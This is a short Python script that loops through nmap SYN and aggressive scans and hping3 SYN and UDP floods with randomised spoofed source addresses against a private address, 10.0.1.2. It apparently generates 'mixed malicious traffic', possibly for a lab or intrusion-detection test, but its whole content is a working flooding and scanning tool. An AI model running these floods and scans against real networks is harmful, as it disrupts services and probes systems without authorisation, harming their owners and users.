#!/usr/bin/env python3
import subprocess
import random
import time
import signal
import sys

TARGET = "10.0.1.2"
TCP_PORT = 80
UDP_PORT = 53

def run_nmap_scan():
    print("\n[ATTACK] Running SYN scan...")
    subprocess.run(["nmap", "-sS", TARGET])

    print("[ATTACK] Running aggressive scan...")
    subprocess.run(["nmap", "-A", TARGET])

def run_syn_flood(duration=10):
    print(f"\n[ATTACK] Starting SYN flood ({duration}s)...")
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "--flood",
        "-p", str(TCP_PORT),
        TARGET,
        "--rand-source"
    ])
    time.sleep(duration)
    process.terminate()
    print("[ATTACK] SYN flood stopped.")

def run_udp_flood(duration=10):
    print(f"\n[ATTACK] Starting UDP flood ({duration}s)...")
    process = subprocess.Popen([
        "sudo", "hping3",
        "--udp",
        "--flood",
        "-p", str(UDP_PORT),
        TARGET,
        "--rand-source"
    ])
    time.sleep(duration)
    process.terminate()
    print("[ATTACK] UDP flood stopped.")

def main():
    print(f"[+] Starting mixed malicious traffic against {TARGET}")
    print("[+] Press Ctrl+C to stop\n")

    attacks = [run_nmap_scan, run_syn_flood, run_udp_flood]

    try:
        while True:
            attack = random.choice(attacks)
            attack()

            pause = random.randint(5, 15)
            print(f"\n[+] Cooling down for {pause} seconds...\n")
            time.sleep(pause)

    except KeyboardInterrupt:
        print("\n[-] Mixed malicious traffic stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()